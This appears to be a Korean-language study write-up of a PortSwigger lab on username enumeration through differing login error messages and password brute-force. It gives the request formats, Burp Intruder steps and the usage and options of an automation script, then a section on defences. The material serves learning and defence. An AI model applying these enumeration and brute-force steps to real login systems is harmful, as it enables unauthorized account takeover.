# Lab: Username enumeration via different responses

## 개요

- **난이도**: Apprentice
- **주제**: Authentication — Username Enumeration / 서로 다른 응답 / Password Brute-force
- **링크**: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

## 목표

로그인 응답의 차이로 유효한 username 을 열거(enumeration)하고, 해당 사용자의 password 를 brute-force 해 계정에 접근한다.

- 입력 목록: PortSwigger 제공 candidate usernames / passwords (각 100여 개)

## 인증 취약점 기초

### Authentication vs Authorization

```
Authentication (인증)   : 사용자가 누구인지 확인 (로그인)
Authorization (인가)    : 그 사용자가 무엇을 할 수 있는지 결정 (권한)
```

이번 랩은 **인증(Authentication)** 자체의 취약점을 다룬다.

### 인증 취약점이 발생하는 원인

```
- 약한 자격증명 (추측 가능한 username/password)
- 무차별 대입(brute-force) 방어 부재
- 논리 결함 (응답 차이, 상태 코드 등 정보 노출)
- 취약한 자격증명 복구/변경 절차
```

### Brute-force 와 Username Enumeration

```
[Brute-force]
  가능한 값들을 반복 시도해 자격증명을 찾는 공격

[Username Enumeration]
  로그인 응답의 미세한 차이로 "존재하는 username" 을 알아내는 것
  → 공격 범위를 유효 username 으로 좁혀 brute-force 효율을 높임

[핵심]
  "아이디가 틀렸습니다" vs "비밀번호가 틀렸습니다"
  → 메시지 차이만으로 username 존재 여부가 새어 나감
```

## 취약 지점

### 1. 응답 메시지로 username 존재 여부 노출

```
GET /login

username = invalid (없는 계정)   → "Invalid username"
username = 실제 계정, pw 틀림    → "Incorrect password"
```

응답 문자열이 다르므로, username 목록을 넣어보면 유효한 계정을 가려낼 수 있다.
(응답 길이/상태 코드/타이밍 차이도 단서가 된다.)

### 2. 로그인 성공 시 상태 코드 차이

```
password 틀림  → 200 OK (에러 페이지)
password 맞음  → 302 Found (계정 페이지로 리다이렉트)
```

password brute-force 시 302 응답이 성공 신호가 된다.

## 공격 단계

### 1단계 — 로그인 요청 분석

로그인 페이지에서 아무 값이나 넣고 요청을 캡처한다. (CSRF 토큰 포함)

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=invalid&password=invalid&csrf=<token>
```

응답: `Invalid username`

### 2단계 — Username Enumeration

username 후보 목록을 순서대로 넣고 password 는 고정한다.
응답이 다른(예: `Incorrect password`) 항목이 유효 username 이다.

```
username=§candidate§ & password=invalid
```

Burp Intruder 에서 **Length** 열을 정렬하면, 유효 username 의 응답만 길이가 다르다.

```
대부분          : "Invalid username"   (짧음)
유효 후보(alice) : "Incorrect password" (상대적으로 긺)
```

→ 유효 username: **alice**

### 3단계 — Password Brute-force

찾은 username 을 고정하고 password 후보를 순회한다.

```
username=alice & password=§candidate§
```

성공 판별: 상태 코드가 `200` 이 아닌 **`302`** 인 항목.

→ 유효 password: **<password>**

### 4단계 — 로그인

```http
POST /login HTTP/1.1

username=alice&password=<password>&csrf=<token>
```

302 로 계정 페이지에 리다이렉트 → 랩 해결.

## 자동화 툴 사용

수동 Intruder 반복 대신 `tools/14-authentication-brute-force.py` 로 자동화할 수 있다.
기본 입력 목록이 PortSwigger 페이지이므로 별도 준비 없이 실행 가능하다.

```bash
python3 tools/14-authentication-brute-force.py \
  --target "https://LAB-ID.web-security-academy.net" --verify
```

```
동작 흐름:
  1) 로그인 페이지 GET → CSRF 토큰 파싱, 세션 유지
  2) username 목록 순회 → "Invalid username" 없는 후보 탐지
  3) 탐지한 username 으로 password 목록 순회 → 302/성공 탐지
  4) --verify 시 로그인 후 계정 페이지 접근 확인

옵션:
  --usernames / --passwords  URL·파일·인라인 목록
  --user <name>              username 을 이미 아는 경우
  --only-enumerate / --only-brute
  --enum-fail / --pass-fail  실패 시그니처 문자열 조정
  --delay                    rate limit/계정 잠금 대응
```

## 방어

```
[근본 원인 1 — 정보 노출]
  응답 메시지/상태코드/길이/타이밍으로 username 존재 여부가 드러남

[근본 원인 2 — brute-force 방어 부재]
  무제한 시도 가능

[올바른 방어]
  1. 인증 실패 응답 통일
     - "Invalid username or password" 처럼 동일한 메시지/상태코드/길이
     - 타이밍 차이도 완화 (존재 여부와 무관하게 동일 연산)
  2. Brute-force 방어
     - 로그인 실패 횟수 기반 rate limiting / 지수 백오프
     - 계정 잠금(account locking) + 알림, CAPTCHA
     - IP/계정 단위 시도 제한
  3. 강한 비밀번호 정책 + 유출 비밀번호 차단
  4. 다중 인증(MFA) 적용
  5. 로그인 실패 모니터링/탐지
```

## 핵심 정리

- 로그인 실패 메시지가 `Invalid username` 과 `Incorrect password` 로 달라 username 을 열거할 수 있었다.
- 유효 username 을 먼저 찾은 뒤 password 목록을 순회해 자격증명을 획득했다.
- 로그인 성공 시 200 이 아닌 302 로 리다이렉트되는 점이 성공 판별 기준이었다.
- 방어는 실패 응답을 통일하고, rate limiting·계정 잠금·MFA 로 무차별 대입을 억제하는 것이다.

## 배운 점

- username enumeration 은 그 자체로도 취약점이며, brute-force 의 효율을 크게 높인다.
- 응답의 내용뿐 아니라 상태 코드·길이·타이밍 차이도 정보가 된다.
- 이 랩을 계기로 `tools/14-authentication-brute-force.py` 를 작성해 username 열거와 password 탐색을 자동화했다.
- 이후 랩(응답 타이밍, 미묘한 차이, IP 차단, 계정 잠금 등)에서는 방어 기법을 어떻게 우회하는지로 확장된다.
